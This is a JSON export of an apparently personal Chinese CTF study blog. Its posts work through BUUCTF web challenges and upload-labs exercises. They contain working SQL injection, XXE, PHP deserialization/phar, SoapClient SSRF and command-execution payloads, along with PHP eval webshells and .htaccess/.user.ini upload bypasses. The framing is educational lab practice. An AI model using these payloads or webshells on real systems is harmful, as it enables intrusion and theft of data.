{"pages":[],"posts":[{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2022/05/02/hello-world/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 php-functions__ 发表于 2022-01-01 记录一些学习时遇到的php函数 stristr stristr(string $haystack, mixed $needle, bool $before_needle = false): string 解释：返回 haystack 字符串从 needle 第一次出现的位置开始到结尾的字符串。（before_needle若为true，将返回之前的部分） php_uname php_uname(string $mode = &quot;a&quot;): string 返回操作系统名称 shell_exec shell_exec(string $cmd): string 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。 str_replace str_replace(mixed $search,mixed $replace,mixed $subject,int &amp;$count = ?):mixed 该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。 array_keys array_keys(array $array, mixed $search_value, bool $strict = false): array 返回数组中部分的或所有的键名 stripslashes stripslashes(string $str): string 反引用一个引用字符串。 stripos stripos(string $haystack, string $needle, int $offset = 0): int 返回在字符串 haystack 中 needle 首次出现的数字位置。不区分大小写 fnmatch fnmatch(string $pattern, string $string, int $flags = 0): bool fnmatch() 检查传入的 string 是否匹配给出的 shell 统配符 pattern。 getimagesize 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。 end，reset函数 end函数： 将内部指针指向数组最后一个元素并输出； reset函数： 将内部指针指向数组第一个元素并输出； exif_imagetype 读取一个图像的第一个字节并检查其签名。 本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上 或和$_SERVER['HTTP_ACCEPT'] 结合使用来检查浏览器是否可以显示某个指定的图像。 __burpsuite-learn upload-labs Note __ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/1/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 buu前一页半的一些题__ 发表于 2022-02-05 HCTF2018{WarmUp} 首先在网页源码看到source.php 访问并审计： hint.php里面的内容为：flag not here, and flag in ffffllllaaaagggg source.php： 审计发现 白名单过滤，只允许[&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 因为我们要传入flag文件路径所以第一个if会为false 看到$_page变量 这里的截取可以理解为截取?file=xxx?aaa里的file=xxx 所以我们把实际要包含的文件放在第二个问号后面，前面用来绕过验证 接下来的if还是会false，再往下 $_page = urldecode($page) 然后再截取一次，这次$_page自身截取 所以在这里开始构造payload 绕过白名单返回true 构造payload： ?file=source.php%253f../../../../../ffffllllaaaagggg 中间问号编码是为了绕过源码中的解码语句 强网杯2019{随便注} ?inject=1' union select 1,2,3# 返回：return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 框内输入：1' order by 2#得知有两列 1';show tables;# 看到表1919810931114514 1';show columns from `1919810931114514`;# 数字表名要用反引号 1';show columns from `1919810931114514`;# 看到flag列 前面的注入得知sql语句是会判断id=用户输入的且查询的是words表 所以把flag列改名为id列， 表名改成words， 再利用网站自己的sql语句查询即可 1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `1919810931114514` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;# 接着使用万能钥匙 1' or 1=1# 得到flag RoarCTF 2019{Easy Calc} php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事： 1.删除空白符 2.将某些字符转换为下划线（包括空格） calc.php页面里操作 在num前加个空格，waf就找不到num这个变量了，但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。 calc.php? num=1;var_dump(scandir(chr(47))) 看到[7]=&gt; string(5) &quot;f1agg&quot; payload： calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) GYCTF2020{BlackList} 本关和随便注看着很像但是增加了黑名单的内容，还是使用堆叠注入 1';show tables;# 看到表 尝试改表名发现： return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); 使用mysql的handler来读取表信息 HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭 1';handler FlagHere open;handler FlagHere read first;# GXYCTF2019{禁止套娃} .git泄露 找到index.php源码 ?R表示引用正则表达式本身，那么这里允许传入的就是下面这种格式 xxx(xxx(xxx(...))); payload需为函数形式，但是不能有参数 localeconv() 函数返回一包含本地数字及货币格式信息的数组 current() 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。 pos() 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。 构造： ?exp=print_r(scandir(current(localeconv()))); 回显：Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .git [3] =&gt; flag.php [4] =&gt; index.php ) ?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 得到flag BJDCTF2020{ZJCTF不过如此} ?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php 得到next.php的源码： &lt;?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(&quot;\\\\1&quot;)', $str ); } foreach($_GET as $re =&gt; $str) { echo complex($re, $str). &quot;\\n&quot;; } function getFlag(){ @eval($_GET['cmd']); } preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行 第二个参数为strtolower(&quot;\\\\1&quot;)，实际上也就是strtolower(&quot;\\1&quot;)，而\\1在正则表达式中有自己的意思，也就是指定第一个匹配项，简单来说就是取出正则表达式匹配后子匹配表达式的第一项 题目会把我们传入的一个get参数的key作为re，value作为待匹配字符串，所以我们要利用这个参数来执行getFlag()方法，并在cmd参数传参 正则表达式 \\S：匹配所有非空白字符； .号：匹配除\\n外的任意字符； 构造payload： /next.php?\\S*=${getFlag()}&amp;cmd=system('cat /flag'); fake XML cookbook XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 username和password都是xml格式 可以添加自己的实体来获取服务器信息 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 看到passwd信息 所以把&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;改成flag路径即可 朴实无华 网页标题有bot 访问robots.txt，看到：/fAke_f1agggg.php 响应头有：/fl4g.php 访问看到代码 level1： 如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型 因此num可以构造为2e4 level2： 找到一串数字使它md5加密前后数值相等 用科学记数法0e绕过 md5=0e215962017 开始get flag 传参不能有空格，如果有cat，将会被替换为wctf2020 get_flag=ls 回显文件有flag $IFS$1代替空格 easy-java 点击help 看到url里有文件包含 题目是easy-java 认为是web.xml泄露 ?filename=WEB-INF/web.xml（GET改成POST，因为servlet有doGet和doPost，所以可以两个都试试） 回显web.xml 看到：com.wm.ctf.FlagController 访问 ?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 看到一段base64编码，解码得到flag FakeBook 注册发现username有超链接 ?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()# users ?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = database() and table_name='users'# no,username,passwd,data ?no=0 union all select 1,data,3,4 from users 发现序列化对象 找源码备份 访问robots.txt看到：/user.php.bak 【*】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。 【*】curl_setopt ： 请求一个url。 【*】CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。 【*】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。 【*】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。 【*】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。 【*】curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。 到这里可以发现，这题是反序列化，我们构造一个序列化对象并把blog内容设置为file协议读取flag.php，它被传入之后网站在显示博客内容时就会反序列化，进而执行恶意代码，读取flag 构造序列化对象： O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;} 构造到联合注入语句里： ?no=0 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' 源码里找到flag进行base64解码 __thinkphp反序列化利用链 buu几道php反序列化题目__ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/10/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 buu几道php反序列化题目__ 发表于 2022-02-10 [安洵杯 2019]easy_serialize_php 在phpinfo看到d0g3_f1ag.php 题目先序列化$_SESSION，然后再经过一个过滤函数，然后再反序列化 过滤函数会替换掉一些关键词，这样就会造成反序列化的对象逃逸 'php','flag','php5','php4','fl1g'会被替换为空 造成序列化对象长度变短 d0g3_f1ag.php进行base64编码：ZDBnM19mMWFnLnBocA== 直接传入show_image显示了hi,here you want to find me? 判断是后台传入另一个文件来读取 思路： 通过构造带有过滤词的序列化对象来造成长度变短的字符串逃逸来修改img对应的值 a:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:1:&quot;a&quot;;} 因为源码里会序列化所以这里要post传入数组，根据这个payload，传入数据为 _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:1:&quot;a&quot;;} 看到： $flag = 'flag in /d0g3_fllllllag'; /d0g3_fllllllag -&gt; L2QwZzNfZmxsbGxsbGFn _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;aa&quot;;s:1:&quot;a&quot;;} 得到flag [MRCTF2020]Ezpop 以调用函数的方式调用一个对象时，__invoke方法会被自动调用 __construct 当一个对象创建时被调用， __toString 当一个对象被当作一个字符串被调用。 __wakeup() 使用unserialize时触发 __get() 用于从不可访问的属性读取数据 #难以访问包括：（1）私有属性，（2）没有初始化的属性 __invoke() 当脚本尝试将对象调用为函数时触发 序列化Pop链： 利用几个类之间相互关联进行构造 文件包含漏洞： Modifier类中append函数使用了include()，会出现文件包含漏洞。 用get方法传一个pop参数后，会自动调用Show类的_wakeup()魔术方法。 _wakeup()通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是Show类，就调用了__toString()方法； 如果__toString()其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的_get()方法。 如果_get()中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的_invoke()方法。 利用文件包含漏洞，使用_invoke()读取flag.php的内容。 &lt;?php class Modifier { protected $var='php://filter/read=convert.base64-encode/resource=flag.php'; } class Show{ public $source; public $str; public function __construct($file){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return 'asd'; } } class Test{ public $p; } $a=new Show('spade'); $a-&gt;str=new Test(); $a-&gt;str-&gt;p=new Modifier(); $b=new Show($a); echo urlencode(serialize($b)); ?&gt; 脚本构造序列化对象传入，得到flag [0CTF 2016]piapiapia 扫目录看到config.php，register.php，index.php，update.php，class.php，profile.php 找到源码：www.zip 分析源码发现： profile.php有：unserialize和file_get_contents update.php有：serialize 思路： 把$profile的photo设为config.php $profile是通过$user的show_profile函数传过来的，传过去$username参数 user类继承mysql类，先过滤再select filter替换字符串中的单引号和双反斜杠为下划线 ，并且替换多个字符串为hacker（where-&gt;hacker） select方法是从数据库中取数据 user类的update_profile更新数据 update.php调用了update_profile，这里是用了POST传入的profile的各个数据来序列化 反序列化字符串逃逸： 传入数组来绕过对nickname的正则校验（传参时写成nickname[]=...） 需要填充的是&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}长度为34，所以要在nickname开头先输入34个where来逃逸修改photo 在update.php传参： nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 接着在profile.php就能看到flag的base64编码 [CISCN2019 华北赛区 Day1 Web1]Dropbox 下载时抓包改路径可以下载到源码 class.php中的File类的delete函数里有unlink()可以利用 测试发现 Filelist类的__destruct方法可以任意文件读取（能下载源码就是因为这个） File类的delete有unlink函数 File类的close方法有file_get_content delete.php中调用了delete函数 文件能上传，有魔术方法，有文件操作函数： 可以phar反序列化 思路： 首先建一个User类，把它的db设为一个FileList类； 把db的files变量设为‘/flag.txt’； 这样当User类销毁时，会导致db执行close方法，FileList没有这个方法所以会调用__call； 如果我们事先把FileList的files变量设置为有一个File对象且初始化filename变量为‘/flag.txt’的数组； 在__call函数里它被处理后就变成：flag.txt调用File类的close方法即读取了flag.txt &lt;?php class User{ public $db; } class File{ public $filename; public function __construct($filename) { $this-&gt;filename = $filename; } } class FileList{ private $files; public function __construct(){ $this-&gt;files=array(new File('/flag.txt')); } } $u = new User(); $u-&gt;db=new FileList(); @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($u); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; 生成后上传抓包改成gif，删除页面filename改为phar://phar.gif即可 [SWPUCTF 2018]SimplePHP 源码提示：flag is in f1ag.php file.php： $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); 猜测是phar反序列化 分析： $file属性是一个Show类，它的str属性是个数组，key为str，值为Test类（因为Test没有source属性，可触发Test的_get方法） 这里注意Test类的param要用key为source，这样它才会在调用不存在的source属性时传入‘source’为参数 接下来要触发Show的toString：C1e4r类的_destruct方法有echo，把这个类初始化传入Show类即可触发 pop链条：C1e4r类的_destruct-&gt;Show的toString-&gt;Test的_get-&gt;Test的file_get 脚本： &lt;?php class C1e4r{ public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $t = new Test(); $c = new C1e4r(); $s = new Show(); $t-&gt;params[&quot;source&quot;]=&quot;/var/www/html/f1ag.php&quot;; $c-&gt;str=$s;//这里注意这句和下一句顺序不能换，因为C1e4r类的str要先赋值，这样destruct时Show对象才会有str['str']的存在 $s-&gt;str['str']=$t; $phar = new Phar(&quot;sp.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); $phar-&gt;setMetadata($c); //触发头是C1e4r类 $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //生成签名 $phar-&gt;stopBuffering(); ?&gt; [BJDCTF2020]EzPHP 网页源码看到： GFXEIM3YFZYGQ4A= base32解码：1nD3x.php 知识点： 1.$_SERVER[‘QUERY_STRING’]不会url解码，可以通过url编码绕过 2.用换行符绕过 ?debu=auqa_is_cute%0a 3.REQUEST可以接受get和post请求,但是post具有优先级，所有可以用post和get传两个一样的来绕过 4.REQUEST会把cookie包含进来，由于cookie里有英文所以过不了那个if，因此需要删除cookie才能过 5.data协议 6.数组绕过sha1 7.利用extract函数将code和args赋值，然后拿flag $_SERVER[“QUERY_STRING”] 获取的是?后面的值 code和arg的传参原理是源码的extract($_GET[&quot;flag&quot;])，这个函数把值赋给键，从而实现传参 arg参数值开头用‘}’来闭合，因为create_function之后，根据传入的参数，实际执行的函数会用一对‘{}’包裹arg里的语句，所以把它闭合从而让构造的命令在函数外面执行，这样就完成create_function注入。这题源码包含了flag.php，所以可以用arg传参输出所有参数 有几个参数会有$_REQUEST的逐项检查是否有字母，由于$_REQUEST读取数据有优先级，所以可以用POST传入同名参数来覆盖从而绕过检测 payload： deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2&amp;fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=}var_dump(get_defined_vars());%23 POST传参：debu=1&amp;file=2 看到：rea1fl4g.php 访问还是没有flag，所以要回到之前的页面包含这个页面，方法是用之前的payload并在arg参数里加上一句：require(base64_dec%6fde(cmVhMWZsNGcucGhw)); 但是得到的flag是假的，所以判断flag不在变量里，这时就要php://协议获取文件的源码 语句：require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php); 为了绕过各种过滤，使用按位取反 require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F)); 这个命令放进payload即可 __buu前一页半的一些题 sql注入-无列名注入__ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/11/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 sql注入-无列名注入__ 发表于 2022-02-14 sql的无列名注入，指的是在不知道表中列名的情况下使用ascii位偏移、union、join等方法读取表中数据的注入 背景 比如一个表有id,username,password三个列，现在知道表名叫users，但是information等用于查列名的关键字被过滤了，这时就可以使用无列名注入 1.union 正常情况下如要读取users的password，使用语句为： select password from users 现在列名不知道，sql注入时一般也没法直接select * ，所以可以用union select 3 from(select 1,2,3 union select * from users)n 这样就生成一个表，列名为1,2,3，而users的数据都在里面 2.join join 连接两张表 using() 用于两张表之间的 join 连接查询，并且 using()中的列在两张表中都存在，作为 join 的条件 select * from(select * from users as a join users b)c 这样会报错列名重复(id) select * from(select * from users as a join users b using(id))c 报错列名重复(username) select * from(select * from users as a join users b using(id,username))c 报错列名重复(password) select * from(select * from users as a join users b using(id,username,password))c 查询出表内容 可知可以用这种方法在报错可用时获取列名 3.ascii位偏移 利用mysql的逐位比较 假设表只有一列flag，内容是abc select * from users获取表内容，构造： (select 'a')&gt;(select * from users)#这个语句把a和flag下的数据得第一位比较，这里因为第一位是a，所以返回0 (select 'b')&gt;(select * from users)#返回1 (select 'ab')&gt;(select * from users)#返回0 (select 'ac')&gt;(select * from users)#返回1 这就构造出了无列名注入的payload，做题时可以用在脚本里盲注 __buu几道php反序列化题目 [ bestphp’s revenge解题记录 __](/2022/02/20/bestphp-s-revenge%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/ “bestphp’s revenge解题记录”) 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/12/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 bestphp’s revenge解题记录__ 发表于 2022-02-20 涉及知识点： 1.session反序列化 2.cookie和session的关系 3.SoapClient的利用 分析： 这题打开看到一段源码，审计并测试后发现，常见的php反序列化和session反序列化使用的引擎有所不同，反序列化时对值的处理不一样，所以这题的步骤有三个： 1.修改session序列化引擎为php_serialize，把序列化内容写入session文件 2.触发SoapClient的__call方法进行ssrf访问flag.php，把flag写入session 3.使用序列化注入的cookie来访问，读取flag 解题： 1.首先修改序列化引擎 利用源码的call_user_func($_GET['f'], $_POST);f传参session_start（因为这个函数能），post再传入：serialize_handler=php_serialize，从而修改session的序列化引擎。 同时这里还要用name参数传入序列化注入payload，把payload存入$_SESSION['name']。 payload： name=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A7%3A%22z3eyond%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A35%3A%22z3eyond%0D%0ACookie%3APHPSESSID%3D123456789%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f=session_start post传参： serialize_handler=php_serialize 2.把flag写入session 利用 $a = array(reset($_SESSION), 'welcome_to_the_lctf2018'); call_user_func($b, $a); 根据刚才存入的序列化对象，这里传参f=extract，post传参b=call_user_func 这样b变量就会被覆盖为call_user_func，源码最后一句就会让a指向的我们注入的SoapClient类调用welcome_to_the_lctf2018方法，进而调用__call，于是服务器携带我们设置的cookie，去访问flag.php，然后把flag，储存在此cookie对应的session中。 注意第一步的payload应用linux来url编码，另外user_agent和uri的名字要设置的一样（比如都是z3eyond）不然不成功 3.把脚本里构造的cookie替换进去，用第二步的传参访问index.php，得到flag __sql注入-无列名注入 buu_不是文件上传_解题记录__ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/13/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 buu_不是文件上传_解题记录__ 发表于 2022-02-20 这题虽有文件上传，但是不是通过木马getshell，而是利用文件名来sql注入，还涉及到反序列化 解题 github里看这题的源码，发现它没有对filename进行过滤，直接放进sql语句里，所以确定注入点是filename；图片数据在保存的时候，会将图片的高度和宽度进行序列化然后保存；在查看图片信息的页面(show.php)会对其进行反序列化。sql语句有五个参数title，filename，ext，path，attr，其中filename我们可控 我们写一个helper类： class helper { protected $ifview = True; protected $config = &quot;/flag&quot;; } 把它序列化，然后进行16进制编码，构造到文件名里，最后payload是： 1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d),('1.png 这样就绕过了网站的过滤，访问show.php时网站反序列化这个数据就会触发helper类的__destruct方法进而读取‘/flag’的内容输出，得到flag [ __bestphp’s revenge解题记录](/2022/02/20/bestphp-s-revenge%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/ “bestphp’s revenge解题记录”) php反序列化 __ 33 日志 (C) 2022 __ Dan Kuroto 由 Hexo 强力驱动 | 主题 – NexT.Muse v5.1.4 __","link":"/2022/05/02/14/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 htaccess and user.ini train__ 发表于 2022-01-16 .htaccess和.user.ini的几道练手题记录 .htaccess [MRCTF2020]是兄弟就来传ma 网页源码： 使用post表单提交文件到upload.php中 tuma.png内容 &lt;?php echo md5(1);@eval($_POST[&quot;pass19&quot;])?&gt; 上传成功 路径为： /var/www/html/upload/6a1bfd81fdc0862a4cb16cc497cd5b63/tuma.jpg 使用htaccess对该图马进行php解析 bp抓包把ctype改成image/png就可以成功上传，为了成功使用还要改名为.htaccess 内容： &lt;FilesMatch &quot;tuma.png&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 路径： /var/www/html/upload/6a1bfd81fdc0862a4cb16cc497cd5b63/1.htaccess 蚁剑成功连接： http://4b8b4387-292f-48b6-bb91-3e46ea2c280e.node4.buuoj.cn:81/upload/6a1bfd81fdc0862a4cb16cc497cd5b63/tuma.png 进入网站系统后在根目录下找到flag 过关 [GXYCTF2019]BabyUpload 直接传马返回：后缀名不能有ph！ 只修改后缀名为png：太露骨... 只修改后缀为jpg：诶，别蒙我啊，这标志明显还是php啊 先尝试传htaccess 内容为： &lt;FilesMatch &quot;tuma.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; bp抓包修改文件名为'.htaccess'，content-type为'image/jpeg' 成功上传 结果： /var/www/html/upload/313fc8fc7fa50eed277a91e9a8d61ee1/.htaccess succesfully uploaded! 接下来传图片木马 内容改成：&quot;php&quot; @eval($_POST[&quot;pass19&quot;])?&gt; 上传成功了，判断是屏蔽了php一句话的开头格式 因此构造木马： &lt;script language=&quot;php&quot;&gt;@eval($_POST[&quot;pass19&quot;]);&lt;/script&gt; 结果： /var/www/html/upload/313fc8fc7fa50eed277a91e9a8d61ee1/tuma.jpg succesfully uploaded! 蚁剑连接： 根目录下看到flag BUU WEB [SUCTF 2019]EasyWeb 本关题解来自csdn 链接： https://blog.csdn.net/qq_42967398/article/details/105615235?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164233722716780269829257%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164233722716780269829257&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-105615235.first_rank_v2_pc_rank_v29&amp;utm_term=user.ini+buu&amp;spm=1018.2226.3001.4187 实际操作中步骤有一点修改 进入网页看到源码 看到有一个hhh变量，get接收，经过长度和正则过滤后，eval执行 这里通过异或绕过构造‘hhh’参数来使用源码的eval 异或脚本： ----------------------------------------------------------- &lt;?php function finds($string){ $index = 0; $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255]; for($i=27;$i&lt;count($a);$i++){ for($j=27;$j&lt;count($a);$j++){ $x = $a[$i] ^ $a[$j]; for($k = 0;$k&lt;strlen($string);$k++){ if(ord($string[$k]) == $x){ echo $string[$k].&quot;\\n&quot;; echo '%' . dechex($a[$i]) . '^%' . dechex($a[$j]).&quot;\\n&quot;; $index++; if($index == strlen($string)){ return 0; } } } } } } finds(&quot;_GET&quot;); ?&gt; ----------------------------------------------------------- ?_=$","link":"/2022/05/02/2/"},{"title":"","text":"__ SpadeHeart __ __首页 __归档 upload-labs Note__ 发表于 2022-01-16 upload-labs学习记录 pass1-js检查 通过检查文件后缀名判断能否上传 本关通过在js里执行一个检查文件后缀名的函数进行对上传文件的客户端检查 如果直接传*.php，会在本地被拦截无法抓包 要先把木马文件变成php后缀，绕过js检查后再抓包改名。 思路： 先写一个一句话木马名为p1horse.php 后缀名改为jpg 点击上传后bp抓包，将文件名后缀改回php 这样就可以绕过js检查 通过菜刀可以成功连接 pass2 服务端检查数据包mime MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 本关在服务端获取$_FILES['upload_file']['type']并验证文件类型是否为图片来判断是否上传 攻击： 直接上传php文件并抓包，将Content-Type改为image/png即可绕过服务端检查 成功上传，菜刀可以连接 pass3 黑名单绕过 服务端从上传的文件的名字里获取后缀检查是否是.asp,.aspx,.php,.jsp 如果是就不上传 利用apache解析漏洞，上传php5,phps等格式的木马来绕过验证 同时文件上传时会进行重命名 查看网页源码可以得到文件名 进行连接可以看到网站内目录 pass4 本关的黑名单过滤了很多脚本后缀，采用 .htaccess 攻击 方法： 先写一个1.htaccess文件，内容为 &lt;FilesMatch &quot;p3.png&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传时名字改为.htaccess 这样会对p3.png这个文件进行php解析，再上传名为p3.png的木马 菜刀连接可以看到网站内部文件 pass5 第五关 黑名单中加上了htaccess文件后缀 本关提示：上传目录存在php文件（readme.php） 从readme.php入手 利用ini文件注入： 写一个.user.ini上传到upload里 .user.ini内容：auto_prepend_file=p5h.png 让所有php文件自动包含p5h.png p5h.png内容： &lt;?php @eval($_POST['pass5']);?&gt; 再上传p5h.png，然后菜刀连接readme.php 这里我查了一些文章但是没有测试成功 所以先换别的方法... 另一种方法 直接传p5h.php &lt;?php @eval($_POST['pass5']);?&gt; 上传时bp抓包在后面加上'. .' 